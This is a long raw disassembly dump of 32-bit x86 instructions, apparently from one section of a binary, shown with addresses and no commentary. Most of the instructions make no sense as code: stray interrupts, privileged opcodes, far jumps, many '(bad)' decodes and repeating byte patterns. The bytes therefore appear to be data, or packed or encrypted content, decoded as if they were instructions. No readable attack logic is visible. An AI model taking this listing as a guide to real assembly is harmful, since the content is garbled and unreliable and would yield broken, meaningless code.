  4231bf:	add    BYTE PTR [edx+0xd760a88],bl
  4231c5:	in     al,dx
  4231c6:	test   BYTE PTR [esi+esi*4],al
  4231c9:	or     eax,0x5d760080
  4231ce:	add    al,0xe6
  4231d0:	pop    ebp
  4231d1:	sub    al,0x82
  4231d3:	sub    eax,0xcdb576cd
  4231d8:	lea    esi,[ebp-0x3f772933]
  4231de:	jmp    FWORD PTR [edx-0xfc43ac5]
  4231e4:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4231ea:	push   ebx
  4231eb:	ror    edi,cl
  4231ed:	pop    ss
  4231ee:	cmc    
  4231ef:	inc    DWORD PTR [eax]
  4231f1:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  4231f7:	jo     0x4231c6
  4231f9:	jbe    0x4231f4
  4231fb:	int    0x8d
  4231fd:	stc    
  4231fe:	int    0xd6
  423200:	mov    BYTE PTR [ebx],bh
  423202:	lds    edi,FWORD PTR [ebx]
  423204:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42320b:	push   ebx
  42320c:	ror    edi,cl
  42320e:	pop    ss
  42320f:	xchg   ebp,eax
  423210:	inc    DWORD PTR [eax]
  423212:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423218:	jo     0x42321a
  42321a:	xchg   esi,eax
  42321b:	or     eax,0xcdf98dcd
  423220:	xchg   esi,eax
  423221:	stc    
  423222:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423225:	(bad)  
  423227:	jmp    0x4231bb
  423229:	shr    edx,cl
  42322b:	sub    BYTE PTR [ebx+0x13],dl
  42322e:	inc    ebx
  42322f:	jge    0x423207
  423231:	mov    ecx,ecx
  423233:	jbe    0x423272
  423235:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42323f:	cmp    eax,ebp
  423241:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423247:	repnz sub BYTE PTR [ebx-0x2d],dl
  42324b:	xchg   DWORD PTR [esi+0x6d],esi
  42324e:	or     dh,BYTE PTR [esi+0x6d]
  423251:	int    0x76
  423253:	cmp    eax,0x1cd46d06
  423258:	int    0x76
  42325a:	mov    ch,0xcd
  42325c:	lea    esi,[ebp-0xfc43ac5]
  423262:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423268:	push   ebx
  423269:	rol    DWORD PTR [edi+0x760a9576],cl
  42326f:	xchg   ebp,eax
  423270:	int    0x76
  423272:	mov    ch,0xcd
  423274:	lea    esi,[ebp-0xfc43ac5]
  42327a:	shl    edx,cl
  42327c:	sub    bl,dl
  42327e:	mov    ebp,0xcdd35392
  423283:	lea    ebp,[ebp+0x76cd7d33]
  423289:	ins    DWORD PTR es:[edi],dx
  42328a:	inc    ebx
  42328b:	shr    DWORD PTR [edi],cl
  42328d:	pop    es
  42328e:	push   eax
  42328f:	inc    DWORD PTR [eax]
  423291:	add    al,al
  423293:	jmp    FWORD PTR [eax-0x326a8933]
  423299:	lea    ebp,[ebp+0x43]
  42329c:	jge    0x423274
  42329e:	xor    DWORD PTR [eax],eax
  4232a0:	(bad)  
  4232a1:	mov    bh,cl
  4232a3:	jbe    0x4232a2
  4232a5:	jo     0x423264
  4232a7:	stc    
  4232a8:	jl     0x42322a
  4232aa:	or     BYTE PTR [edx],0x76
  4232ad:	jne    0x42329b
  4232af:	sbb    cl,ch
  4232b1:	jbe    0x423328
  4232b3:	int    0x8d
  4232b5:	mov    ch,0xcd
  4232b7:	xchg   esi,eax
  4232b8:	mov    ch,0x3b
  4232ba:	or     al,0x3b
  4232bc:	cdq    
  4232bd:	shr    ebx,cl
  4232bf:	xchg   edx,eax
  4232c0:	shr    edx,cl
  4232c2:	sub    BYTE PTR [ebx+0x13],dl
  4232c5:	push   ecx
  4232c6:	mov    ch,cl
  4232c8:	jbe    0x4232c3
  4232ca:	int    0x8d
  4232cc:	stc    
  4232cd:	cmp    eax,ebp
  4232cf:	cmp    ecx,DWORD PTR [edi]
  4232d1:	shl    edx,cl
  4232d3:	sub    bl,dl
  4232d5:	mov    ebp,0xcdd35392
  4232da:	lea    esi,[ebp+0x43]
  4232dd:	shr    DWORD PTR [edi],cl
  4232df:	add    eax,0x80805300
  4232e4:	int    0x76
  4232e6:	stc    
  4232e7:	int    0x8d
  4232e9:	stc    
  4232ea:	cmp    eax,ebp
  4232ec:	cmp    ecx,DWORD PTR [edi]
  4232ee:	shl    edx,cl
  4232f0:	sub    bl,dl
  4232f2:	mov    ebp,0xcdd35392
  4232f7:	(bad)  
  4232f8:	std    
  4232f9:	inc    ebx
  4232fa:	shr    DWORD PTR [edi],cl
  4232fc:	add    eax,0x808053ea
  423301:	int    0x76
  423303:	stc    
  423304:	int    0x8d
  423306:	stc    
  423307:	cmp    eax,ebp
  423309:	cmp    ecx,DWORD PTR [edi]
  42330b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423311:	push   ebx
  423312:	shr    esp,cl
  423314:	adc    al,0xcd
  423316:	lea    esi,[ebp+0x3bb596cd]
  42331c:	or     al,0x3b
  42331e:	cdq    
  42331f:	shr    ebx,cl
  423321:	xchg   edx,eax
  423322:	shr    edx,cl
  423324:	sub    BYTE PTR [ebx+0x13],dl
  423327:	xchg   ebx,edx
  423329:	int    0x8d
  42332b:	std    
  42332c:	inc    ebx
  42332d:	rol    DWORD PTR [edx-0x2893219],cl
  423333:	or     dh,BYTE PTR [esi-0x53]
  423336:	int    0x76
  423338:	jne    0x423344
  42333a:	jbe    0x42330c
  42333c:	ret    
  42333d:	dec    ecx
  42333e:	and    DWORD PTR [esi+0x45e60a35],eax
  423344:	leave  
  423345:	jbe    0x4232e4
  423347:	inc    ecx
  423348:	and    DWORD PTR [esi+0x4576cd35],eax
  42334e:	int    0x8d
  423350:	inc    ebp
  423351:	cmp    eax,ebp
  423353:	cmp    ecx,DWORD PTR [edi]
  423355:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42335b:	push   ebx
  42335c:	ror    DWORD PTR [edx],cl
  42335e:	jbe    0x4233b5
  423360:	int    0x76
  423362:	inc    ebp
  423363:	int    0x8d
  423365:	inc    ebp
  423366:	cmp    eax,ebp
  423368:	cmp    ecx,DWORD PTR [edi]
  42336a:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423370:	push   ebx
  423371:	ror    DWORD PTR [edx],cl
  423373:	jbe    0x42330a
  423375:	leave  
  423376:	jbe    0x4233b5
  423378:	dec    eax
  423379:	and    DWORD PTR [esi+0x1d76c935],eax
  42337f:	ret    0x8621
  423382:	xor    eax,0xcd4576cd
  423387:	lea    eax,[ebp+0x3b]
  42338a:	lds    edi,FWORD PTR [ebx]
  42338c:	psrlq  mm6,mm2
  42338f:	sub    bl,dl
  423391:	mov    ebp,0xcdd35392
  423396:	lea    ebp,[ebp+0x52f7d43]
  42339c:	push   ss
  42339d:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233a3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233aa:	cmp    eax,0x3b5596cd
  4233af:	jns    0x4233ec
  4233b1:	or     al,0xd3
  4233b3:	lods   eax,DWORD PTR ds:[esi]
  4233b4:	sub    bl,dl
  4233b6:	jmp    0x42334a
  4233b8:	push   ebx
  4233b9:	jge    0x423388
  4233bb:	jbe    0x42336a
  4233bd:	xor    edx,edx
  4233bf:	cmp    ebx,edx
  4233c1:	clc    
  4233c2:	add    cl,BYTE PTR [edx]
  4233c4:	jbe    0x42335b
  4233c6:	int    0x76
  4233c8:	sbb    eax,0x3b1d8dcd
  4233cd:	lds    edi,FWORD PTR [ebx]
  4233cf:	psrlq  mm6,mm2
  4233d2:	sub    bl,dl
  4233d4:	mov    ebp,0xcdd35392
  4233d9:	lea    edx,[ebp+0x16d87d43]
  4233df:	int    0x76
  4233e1:	sbb    eax,0x3b1d8dcd
  4233e6:	lds    edi,FWORD PTR [ebx]
  4233e8:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  4233ef:	push   ebx
  4233f0:	ror    DWORD PTR [edx],cl
  4233f2:	jbe    0x423389
  4233f4:	int    0x76
  4233f6:	cmp    eax,0x3b3d8dcd
  4233fb:	lds    edi,FWORD PTR [ebx]
  4233fd:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423404:	push   ebx
  423405:	ror    ebp,cl
  423407:	lea    edx,[ebp+0xad3d12f]
  42340d:	jbe    0x4233a4
  42340f:	int    0x76
  423411:	inc    ebp
  423412:	int    0x8d
  423414:	inc    ebp
  423415:	cmp    eax,ebp
  423417:	cmp    ecx,DWORD PTR [edi]
  423419:	shl    edx,cl
  42341b:	sub    bl,dl
  42341d:	mov    ebp,0xcdd35392
  423422:	lea    edx,[ebp+0x52f7d43]
  423428:	pusha  
  423429:	xchg   edx,eax
  42342a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423431:	or     eax,0x875576cd
  423436:	jbe    0x423408
  423438:	or     ah,dh
  42343a:	xchg   ebp,eax
  42343b:	or     dh,BYTE PTR [esi+0x6d]
  42343e:	pop    ebp
  42343f:	inc    ecx
  423440:	and    DWORD PTR [esi+0x5d760a35],eax
  423446:	leave  
  423447:	jbe    0x42345e
  423449:	cmp    DWORD PTR [ecx],esp
  42344b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423451:	and    DWORD PTR [esi-0xe89f5cb],eax
  423457:	int    0x76
  423459:	xchg   ebp,eax
  42345a:	int    0x8d
  42345c:	xchg   ebp,eax
  42345d:	cmp    eax,ebp
  42345f:	cmp    ecx,DWORD PTR [edi]
  423461:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423467:	push   ebx
  423468:	ror    DWORD PTR [edx],cl
  42346a:	jbe    0x4234e9
  42346c:	int    0x6d
  42346e:	jmp    0x423476
  423470:	add    DWORD PTR [eax-0x36923280],0x7006
  42347a:	add    BYTE PTR [ebx],cl
  42347c:	and    DWORD PTR [esi-0x369232cb],eax
  423482:	push   es
  423483:	xchg   esp,eax
  423484:	add    BYTE PTR [eax],al
  423486:	add    bh,dh
  423488:	and    DWORD PTR [esi-0x329232cb],eax
  42348e:	ins    DWORD PTR es:[edi],dx
  42348f:	int    0x76
  423491:	icebp  
  423492:	int    0x8d
  423494:	icebp  
  423495:	cmp    eax,ebp
  423497:	cmp    ecx,DWORD PTR [edi]
  423499:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42349f:	push   ebx
  4234a0:	ror    ebp,cl
  4234a2:	lea    edi,[ebp+0x2f]
  4234a5:	rcl    ebx,1
  4234a7:	int    0x8d
  4234a9:	ins    DWORD PTR es:[edi],dx
  4234aa:	retf   0x8884
  4234ad:	or     DWORD PTR [esi-0x57],esi
  4234b0:	int    0x6d
  4234b2:	int    0x76
  4234b4:	icebp  
  4234b5:	int    0x8d
  4234b7:	icebp  
  4234b8:	cmp    ecx,DWORD PTR [edi]
  4234ba:	cmp    eax,ebp
  4234bc:	shl    edx,cl
  4234be:	sub    bl,dl
  4234c0:	mov    ebp,0xcdd35392
  4234c5:	lea    edi,[ebp+0x2f]
  4234c8:	rcl    ebx,1
  4234ca:	int    0x8d
  4234cc:	adc    eax,0x3b1596cd
  4234d1:	or     al,0x3b
  4234d3:	cdq    
  4234d4:	shr    ebx,cl
  4234d6:	xchg   edx,eax
  4234d7:	shr    edx,cl
  4234d9:	sub    BYTE PTR [ebx+0x13],dl
  4234dc:	xchg   ebx,edx
  4234de:	int    0x8d
  4234e0:	ins    DWORD PTR es:[edi],dx
  4234e1:	das    
  4234e2:	pop    ecx
  4234e3:	dec    esp
  4234e4:	mov    ch,cl
  4234e6:	push   es
  4234e7:	jo     0x4234e9
  4234e9:	add    BYTE PTR [eax],al
  4234eb:	int    0x17
  4234ed:	jo     0x4234ef
  4234ef:	add    BYTE PTR [eax],al
  4234f1:	cmp    eax,ebp
  4234f3:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  4234f9:	jmp    0x2fd3:0x87d25328
  423500:	pop    ecx
  423501:	lea    ebp,[ecx-0x72f682c5]
  423507:	test   eax,0x76ca6dcd
  42350c:	test   eax,0xcdf18dcd
  423511:	xchg   esi,eax
  423512:	icebp  
  423513:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423516:	cdq    
  423517:	shr    edx,cl
  423519:	sub    bl,dl
  42351b:	jmp    0x4234af
  42351d:	push   ebx
  42351e:	adc    ecx,ebp
  423520:	xchg   esi,eax
  423521:	jge    0x423552
  423523:	rcl    DWORD PTR [ebx],1
  423525:	int    0x96
  423527:	ins    DWORD PTR es:[edi],dx
  423528:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42352f:	icebp  
  423530:	int    0x8d
  423532:	icebp  
  423533:	cmp    eax,ebp
  423535:	cmp    ecx,DWORD PTR [edi]
  423537:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42353d:	push   ebx
  42353e:	ror    ebp,cl
  423540:	lea    edi,[ebp+0x2f]
  423543:	rcl    ebx,1
  423545:	int    0x8d
  423547:	ins    DWORD PTR es:[edi],dx
  423548:	retf   0x8884
  42354b:	or     DWORD PTR [esi-0x57],esi
  42354e:	int    0x6d
  423550:	int    0x76
  423552:	icebp  
  423553:	int    0x8d
  423555:	icebp  
  423556:	cmp    eax,ebp
  423558:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42355e:	repnz sub BYTE PTR [ebx-0x2d],dl
  423562:	int    0x8d
  423564:	jge    0x423595
  423566:	rcl    ebx,1
  423568:	int    0x8d
  42356a:	pop    ebp
  42356b:	int    0x96
  42356d:	pop    ebp
  42356e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423571:	cdq    
  423572:	shr    ebx,cl
  423574:	xchg   edx,eax
  423575:	shr    edx,cl
  423577:	sub    BYTE PTR [ebx+0x13],dl
  42357a:	xchg   ebx,edx
  42357c:	int    0x8d
  42357e:	ins    DWORD PTR es:[edi],dx
  42357f:	das    
  423580:	pop    ecx
  423581:	dec    esp
  423582:	mov    ch,cl
  423584:	push   es
  423585:	xchg   esp,eax
  423586:	add    BYTE PTR [eax],al
  423588:	add    ch,cl
  42358a:	pop    ss
  42358b:	xchg   esp,eax
  42358c:	add    BYTE PTR [eax],al
  42358e:	add    BYTE PTR [ebx],bh
  423590:	lds    edi,FWORD PTR [ebx]
  423592:	cdq    
  423593:	sar    DWORD PTR [ebp+0x28ead392],cl
  423599:	push   ebx
  42359a:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235a0:	test   eax,0x8d097d3b
  4235a5:	test   eax,0x76ca6dcd
  4235aa:	test   eax,0xcdf18dcd
  4235af:	xchg   esi,eax
  4235b0:	icebp  
  4235b1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235b4:	cdq    
  4235b5:	shr    edx,cl
  4235b7:	sub    bl,dl
  4235b9:	jmp    0x42354d
  4235bb:	push   ebx
  4235bc:	adc    ecx,ebp
  4235be:	xchg   esi,eax
  4235bf:	jge    0x4235f0
  4235c1:	rcl    DWORD PTR [ebx],1
  4235c3:	int    0x96
  4235c5:	ins    DWORD PTR es:[edi],dx
  4235c6:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235cd:	xor    eax,0x3b358dcd
  4235d2:	(bad)  
  4235d4:	(bad)
  4235d7:	sub    bl,dl
  4235d9:	mov    ebp,0xcdd35392
  4235de:	lea    ebx,[ebp-0x33]
  4235e1:	xchg   esi,eax
  4235e2:	pop    ebp
  4235e3:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235e6:	cdq    
  4235e7:	shr    ebx,cl
  4235e9:	xchg   edx,eax
  4235ea:	shr    edx,cl
  4235ec:	sub    BYTE PTR [ebx+0x13],dl
  4235ef:	das    
  4235f0:	rcl    ebx,1
  4235f2:	xchg   DWORD PTR [esi+0x7d],esi
  4235f5:	or     dh,BYTE PTR [esi+0x7d]
  4235f8:	int    0x76
  4235fa:	jge    0x4235c9
  4235fc:	lea    ecx,ds:0xb2f7d43
  423602:	(bad)  
  423603:	inc    DWORD PTR [eax]
  423605:	add    ch,cl
  423607:	jbe    0x423666
  423609:	int    0x8d
  42360b:	pop    ebp
  42360c:	cmp    ecx,DWORD PTR [edi]
  42360e:	shl    edx,cl
  423610:	sub    BYTE PTR [ebx],bh
  423612:	(bad)
  423615:	xchg   edx,eax
  423616:	push   ebx
  423617:	ror    ebp,cl
  423619:	lea    ecx,ds:0xcdd3d12f
  42361f:	lea    edx,[ebp-0x142cf3c5]
  423625:	xchg   edx,eax
  423626:	push   ebx
  423627:	ror    ebp,cl
  423629:	lea    edx,[ebp-0xd2cf0c5]
  42362f:	sub    BYTE PTR [ebx-0x2d],dl
  423632:	or     dh,BYTE PTR [esi+0x35]
  423635:	int    0x76
  423637:	popf   
  423638:	int    0x8d
  42363a:	popf   
  42363b:	cmp    ecx,DWORD PTR [edi]
  42363d:	shl    edx,cl
  42363f:	sub    BYTE PTR [ebx],bh
  423641:	(bad)
  423644:	xchg   edx,eax
  423645:	push   ebx
  423646:	ror    ebp,cl
  423648:	lea    ebx,[ebp+0x3b9d96cd]
  42364e:	or     al,0xd3
  423650:	jmp    0x4235e4
  423652:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423658:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42365e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  423664:	in     al,dx
  423665:	sbb    al,0xcd
  423667:	jbe    0x423606
  423669:	int    0x8d
  42366b:	popf   
  42366c:	cmp    eax,ebp
  42366e:	cmp    ecx,DWORD PTR [edi]
  423670:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423676:	push   ebx
  423677:	rol    DWORD PTR [edi+0x760a5576],cl
  42367d:	push   ebp
  42367e:	int    0x76
  423680:	popf   
  423681:	int    0x8d
  423683:	popf   
  423684:	cmp    eax,ebp
  423686:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42368c:	repnz sub BYTE PTR [ebx-0x2d],dl
  423690:	int    0x8d
  423692:	lods   eax,DWORD PTR ds:[esi]
  423693:	xor    edi,DWORD PTR [ebp-0x33]
  423696:	jbe    0x423635
  423698:	int    0x96
  42369a:	popf   
  42369b:	cmp    eax,ebp
  42369d:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236a3:	mov    ebp,0xcdd25392
  4236a8:	xchg   esi,eax
  4236a9:	push   ebp
  4236aa:	das    
  4236ab:	rcl    edx,1
  4236ad:	inc    ebx
  4236ae:	shr    DWORD PTR [edi],cl
  4236b0:	pop    es
  4236b1:	adc    ebp,edi
  4236b3:	add    BYTE PTR [eax],al
  4236b5:	int    0x76
  4236b7:	stc    
  4236b8:	int    0x76
  4236ba:	stc    
  4236bb:	int    0x76
  4236bd:	std    
  4236be:	or     dh,BYTE PTR [esi+0x35]
  4236c1:	int    0x76
  4236c3:	mov    ch,cl
  4236c5:	lea    esp,ds:0x3b2596cd
  4236cb:	or     al,0xd3
  4236cd:	jmp    0x423661
  4236cf:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4236d5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4236dc:	jno    0x4236ab
  4236de:	lea    esp,[ebp-0x33]
  4236e1:	xchg   esi,eax
  4236e2:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4236e6:	cdq    
  4236e7:	shr    ebx,cl
  4236e9:	xchg   edx,eax
  4236ea:	shr    edx,cl
  4236ec:	sub    BYTE PTR [ebx+0x13],dl
  4236ef:	jno    0x4236be
  4236f1:	(bad)  
  4236f2:	stc    
  4236f3:	int    0x96
  4236f5:	stc    
  4236f6:	add    dh,dl
  4236f8:	xor    eax,0x993b0c3b
  4236fd:	shr    ebx,cl
  4236ff:	xchg   edx,eax
  423700:	shr    edx,cl
  423702:	sub    BYTE PTR [ebx+0x13],dl
  423705:	jno    0x423707
  423707:	jo     0x42371d
  423709:	int    0x8d
  42370b:	stc    
  42370c:	int    0x96
  42370e:	stc    
  42370f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423712:	cdq    
  423713:	shr    ebx,cl
  423715:	xchg   edx,eax
  423716:	shr    edx,cl
  423718:	sub    BYTE PTR [ebx+0x13],dl
  42371b:	or     dh,BYTE PTR [esi+0x65]
  42371e:	inc    ebx
  42371f:	jge    0x423750
  423721:	add    eax,0x808080ab
  423726:	int    0x76
  423728:	stc    
  423729:	in     al,dx
  42372a:	(bad)  
  42372b:	int    0x96
  42372d:	or     dh,BYTE PTR gs:[esi-0x53]
  423731:	push   ecx
  423732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423733:	lods   eax,DWORD PTR ds:[esi]
  423734:	int    0x8d
  423736:	lods   eax,DWORD PTR ds:[esi]
  423737:	shr    ebx,cl
  423739:	xchg   edx,eax
  42373a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42373d:	lods   eax,DWORD PTR ds:[esi]
  42373e:	sub    BYTE PTR [ebx-0x2d],dl
  423741:	int    0x8d
  423743:	jne    0x42370f
  423745:	dec    esp
  423746:	or     DWORD PTR [ecx],0x8dcd304c
  42374c:	mov    ch,0xcd
  42374e:	lea    esi,[ebp+0x3bb596cd]
  423754:	or     al,0x3b
  423756:	cdq    
  423757:	shr    edx,cl
  423759:	sub    bl,dl
  42375b:	jmp    0x4236ef
  42375d:	push   ebx
  42375e:	adc    ecx,ebp
  423760:	xchg   esi,eax
  423761:	mov    ch,0x87
  423763:	jge    0x423732
  423765:	jbe    0x423714
  423767:	cmp    edx,ebp
  423769:	add    al,0xad
  42376b:	std    
  42376c:	add    al,0xea
  42376e:	std    
  42376f:	shr    ebx,cl
  423771:	sub    BYTE PTR [edi+0x3bd353d2],al
  423777:	leave  
  423778:	int    0x8d
  42377a:	std    
  42377b:	int    0x96
  42377d:	std    
  42377e:	shr    edx,cl
  423780:	xchg   edx,eax
  423781:	shr    ebx,cl
  423783:	sub    BYTE PTR [ebx-0x1d],dl
  423786:	cmp    ebx,ecx
  423788:	inc    ebx
  423789:	rcl    dh,cl
  42378b:	mov    ds:0xcd8876cd,eax
  423790:	lea    ebp,ds:0xcd2d96cd
  423796:	add    DWORD PTR [ecx],edx
  423798:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237a2:	shr    edx,cl
  4237a4:	sub    BYTE PTR [ebx+0x13],dl
  4237a7:	jno    0x423776
  4237a9:	(bad)  
  4237aa:	stc    
  4237ab:	int    0x96
  4237ad:	stc    
  4237ae:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237b1:	cdq    
  4237b2:	shr    ebx,cl
  4237b4:	xchg   edx,eax
  4237b5:	shr    edx,cl
  4237b7:	sub    BYTE PTR [ebx+0x13],dl
  4237ba:	jno    0x4237bc
  4237bc:	(bad)  
  4237bd:	jne    0x4237bf
  4237bf:	jo     0x4237dd
  4237c1:	int    0x76
  4237c3:	or     dh,BYTE PTR gs:[esi+0x75]
  4237c7:	int    0x76
  4237c9:	xor    eax,0xcdfd760a
  4237ce:	jbe    0x4237cd
  4237d0:	cmp    ecx,ebx
  4237d2:	add    al,0xbd
  4237d4:	test   ah,dl
  4237d6:	xor    ecx,ebp
  4237d8:	jbe    0x42384f
  4237da:	int    0x14
  4237dc:	mov    ch,cl
  4237de:	jbe    0x423855
  4237e0:	int    0x84
  4237e2:	mov    BYTE PTR [ebx],bh
  4237e4:	jns    0x423821
  4237e6:	aad    0xd3
  4237e8:	lods   eax,DWORD PTR ds:[esi]
  4237e9:	sub    bl,dl
  4237eb:	repz xchg edx,eax
  4237ed:	push   ebx
  4237ee:	ror    ch,cl
  4237f0:	xchg   esi,eax
  4237f1:	jne    0x4237fd
  4237f3:	test   BYTE PTR [edx-0x33],cl
  4237f6:	jbe    0x4237f5
  4237f8:	add    al,0xd3
  4237fa:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423801:	xlat   BYTE PTR ds:[ebx]
  423802:	int    0x76
  423804:	std    
  423805:	cmp    ecx,ebx
  423807:	add    al,0xbd
  423809:	test   ah,dl
  42380b:	xor    ecx,ebp
  42380d:	jbe    0x423884
  42380f:	int    0x14
  423811:	mov    ch,cl
  423813:	jbe    0x42388a
  423815:	int    0x84
  423817:	mov    BYTE PTR [ebx],bh
  423819:	jns    0x423856
  42381b:	aad    0xd3
  42381d:	lods   eax,DWORD PTR ds:[esi]
  42381e:	sub    bl,dl
  423820:	repz xchg edx,eax
  423822:	push   ebx
  423823:	ror    ch,cl
  423825:	xchg   esi,eax
  423826:	jne    0x423832
  423828:	test   BYTE PTR [edx-0x33],cl
  42382b:	jbe    0x42382a
  42382d:	add    al,0xd3
  42382f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423836:	xlat   BYTE PTR ds:[ebx]
  423837:	int    0x76
  423839:	jne    0x423845
  42383b:	jbe    0x42384a
  42383d:	int    0x76
  42383f:	mov    ch,0xcd
  423841:	lea    esi,[ebp+0xf3bc53b]
  423847:	shl    edx,cl
  423849:	sub    bl,dl
  42384b:	mov    ebp,0xcdd35392
  423850:	(bad)  
  423851:	stc    
  423852:	or     dh,BYTE PTR [esi+0x25]
  423855:	leave  
  423856:	jbe    0x423824
  423858:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42385f:	imul   edx,ebp,0x8d0a0c69
  423865:	gs adc bh,dl
  423868:	into   
  423869:	and    DWORD PTR [esi-0x32fad0cb],eax
  42386f:	add    BYTE PTR [eax+0xd96cd80],0xcd
  423876:	sar    DWORD PTR [ebx],cl
  423878:	lds    ecx,FWORD PTR [edx]
  42387a:	jbe    0x423829
  42387c:	rol    esi,cl
  42387e:	lods   eax,DWORD PTR ds:[esi]
  42387f:	xchg   edx,eax
  423880:	or     dh,BYTE PTR [esi-0x30]
  423883:	int    0xd3
  423885:	cmp    edi,DWORD PTR [ecx-0x2d]
  423888:	lods   eax,DWORD PTR ds:[esi]
  423889:	sub    BYTE PTR [ebx+0x76],dl
  42388c:	lods   eax,DWORD PTR ds:[esi]
  42388d:	retf   0x858c
  423890:	int3   
  423891:	das    
  423892:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  42389d:	retf   
  42389e:	inc    ebx
  42389f:	rcl    esi,cl
  4238a1:	jle    0x423870
  4238a3:	jbe    0x42385a
  4238a5:	int    0x8d
  4238a7:	mov    ch,0xcd
  4238a9:	jbe    0x423860
  4238ab:	int    0x96
  4238ad:	mov    ch,0x3b
  4238af:	jns    0x4238ec
  4238b1:	or     al,0xd3
  4238b3:	lods   eax,DWORD PTR ds:[esi]
  4238b4:	sub    bl,dl
  4238b6:	jmp    0x42384a
  4238b8:	push   ebx
  4238b9:	jge    0x423888
  4238bb:	jbe    0x423922
  4238bd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238c0:	lods   eax,DWORD PTR ds:[esi]
  4238c1:	sub    BYTE PTR [ebx+0x76],dl
  4238c4:	lods   eax,DWORD PTR ds:[esi]
  4238c5:	cmp    edx,ebp
  4238c7:	xchg   DWORD PTR [ebp-0x33],edi
  4238ca:	jbe    0x42389c
  4238cc:	add    al,0xea
  4238ce:	std    
  4238cf:	add    al,0xad
  4238d1:	std    
  4238d2:	shr    ebx,cl
  4238d4:	sub    BYTE PTR [edi+0x3b1353f1],al
  4238da:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  4238e1:	and    DWORD PTR [esi-0x323329cb],eax
  4238e7:	jbe    0x42390e
  4238e9:	in     al,dx
  4238ea:	and    cl,ch
  4238ec:	jbe    0x4238e7
  4238ee:	int    0x8d
  4238f0:	stc    
  4238f1:	cmp    eax,ebp
  4238f3:	cmp    ecx,DWORD PTR [edi]
  4238f5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4238fb:	push   ebx
  4238fc:	ror    ebp,cl
  4238fe:	(bad)  
  4238ff:	stc    
  423900:	int    0x96
  423902:	stc    
  423903:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423906:	cdq    
  423907:	shr    ebx,cl
  423909:	xchg   edx,eax
  42390a:	shr    edx,cl
  42390c:	sub    BYTE PTR [ebx+0x13],dl
  42390f:	inc    ebx
  423910:	jge    0x423941
  423912:	add    eax,0x80809223
  423917:	int    0x76
  423919:	or     eax,0xa886ccd
  42391e:	out    0xb5,al
  423920:	leave  
  423921:	jbe    0x423948
  423923:	mov    dl,0x21
  423925:	xchg   BYTE PTR ds:0x393576c9,dh
  42392b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423931:	dec    ecx
  423932:	mov    al,ds:0x76c93586
  423937:	lods   eax,DWORD PTR ds:[esi]
  423938:	imul   esp,DWORD PTR [ecx],0x76c93586
  42393e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423942:	xor    eax,0xcd3d760a
  423947:	jbe    0x4238d1
  423949:	int    0x8d
  42394b:	lods   eax,DWORD PTR ds:[esi]
  42394c:	int    0x96
  42394e:	lods   eax,DWORD PTR ds:[esi]
  42394f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423952:	jmp    0x4238e6
  423954:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42395a:	adc    esi,DWORD PTR [ecx-0x33]
  42395d:	lea    edx,[ebp+0x3b9596cd]
  423963:	or     al,0xd3
  423965:	jmp    0x4238f9
  423967:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  42396d:	add    BYTE PTR [eax+0x5328ead3],0x13
  423974:	jno    0x423943
  423976:	lea    esp,[ebp-0x33]
  423979:	xchg   esi,eax
  42397a:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  42397e:	cdq    
  42397f:	shr    ebx,cl
  423981:	xchg   edx,eax
  423982:	shr    edx,cl
  423984:	sub    BYTE PTR [ebx+0x13],dl
  423987:	jno    0x423956
  423989:	lea    esi,[ebp+0x3bb596cd]
  42398f:	or     al,0x3b
  423991:	cdq    
  423992:	shr    ebx,cl
